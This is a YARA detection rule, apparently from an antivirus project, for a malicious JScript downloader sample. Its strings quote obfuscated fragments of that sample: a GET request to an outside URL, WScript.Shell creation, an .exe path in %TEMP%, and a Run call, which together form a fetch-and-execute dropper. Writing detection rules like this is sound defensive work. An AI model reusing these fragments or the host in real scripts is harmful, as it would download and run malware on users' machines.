rule sig_20160330_add53057bd20ea6ef99a514921e13f5d {
  meta:
    description = "datamaliciousorder - file 20160330_add53057bd20ea6ef99a514921e13f5d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4847aefc343318078bd29cf2ed2f580f18e185cffa4e8777ea06fe19caf62d4a"

  strings:
    $s1  = "_LX[_DG](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _S = function _B() {return WScript[_KE](\"WScript\"+\".Shell\");}(), _ET = 11;" fullword ascii
    $s3  = "function _AS(_U, _I){_SI = _SI * 1; return _U - _I;};" fullword ascii
    $s4  = "if (_LX[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _PC(){return _FQ + \"\";};" fullword ascii
    $s6  = "function _WI() {return _S[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2I7S8lcnmX.ex\" + \"e\";};" fullword ascii
    $s7  = "function _LM(_TQ){_S[\"Run\"](_TQ, _SI, _SI);};" fullword ascii
    $s8  = "function _Q() {return ((_D0 == true) && (_D0 == _N)) ? 1 : _SI;};" fullword ascii
    $s9  = "function _L()" fullword ascii
    $s10 = " while (_BM){" fullword ascii
    $s11 = "return _AS(_P, _R0);" fullword ascii
    $s12 = "function _AM(){return 22;};" fullword ascii
    $s13 = "var _DN = new this[\"Date\"]();" fullword ascii
    $s14 = "function _FB(_V) {var _D = (1, 2, 3, 4, 5, _V); return _D;};" fullword ascii
    $s15 = "function _DK(){return _KE;};" fullword ascii
    $s16 = "var _D0 = false;" fullword ascii
    $s17 = "var _N = false;" fullword ascii
    $s18 = "_D0 = true; " fullword ascii
    $s19 = "_N = true; " fullword ascii
    $s20 = "var _T = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}